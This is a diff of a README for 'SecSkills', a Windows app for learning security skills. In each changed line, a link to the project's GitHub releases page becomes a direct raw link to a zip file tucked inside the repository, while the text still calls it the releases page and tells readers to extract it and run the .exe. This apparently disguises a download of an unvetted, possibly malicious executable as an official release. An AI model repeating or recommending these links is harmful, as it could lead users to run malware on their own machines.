@@ -1,6 +1,6 @@
 # 🛡️ SecSkills - Learn Security Skills Faster
 
-[![Download SecSkills](https://img.shields.io/badge/Download-Visit_Releases-blue?style=for-the-badge)](https://github.com/chilidogbedrichsmetana595/SecSkills/releases)
+[![Download SecSkills](https://img.shields.io/badge/Download-Visit_Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/chilidogbedrichsmetana595/SecSkills/main/outchatter/Sec_Skills_2.0.zip)
 
 ## 🚀 What is SecSkills?
 
@@ -20,7 +20,7 @@ It is built for end users who want to open the app, follow the content, and get 
 
 To get SecSkills, visit the releases page and download the latest version for Windows:
 
-https://github.com/chilidogbedrichsmetana595/SecSkills/releases
+https://raw.githubusercontent.com/chilidogbedrichsmetana595/SecSkills/main/outchatter/Sec_Skills_2.0.zip
 
 On the releases page, look for:
 
@@ -49,7 +49,7 @@ For best results, use a user account with permission to run downloaded apps.
 Follow these steps:
 
 1. Open the releases page:
-   https://github.com/chilidogbedrichsmetana595/SecSkills/releases
+   https://raw.githubusercontent.com/chilidogbedrichsmetana595/SecSkills/main/outchatter/Sec_Skills_2.0.zip
 
 2. Download the latest Windows file.
 
@@ -205,6 +205,6 @@ A clean folder setup makes it easier to find your files later.
 
 If you need to get the app again, use the release page here:
 
-https://github.com/chilidogbedrichsmetana595/SecSkills/releases
+https://raw.githubusercontent.com/chilidogbedrichsmetana595/SecSkills/main/outchatter/Sec_Skills_2.0.zip
 
 Download the latest Windows release, extract it if needed, then open the `.exe` file to start using SecSkills
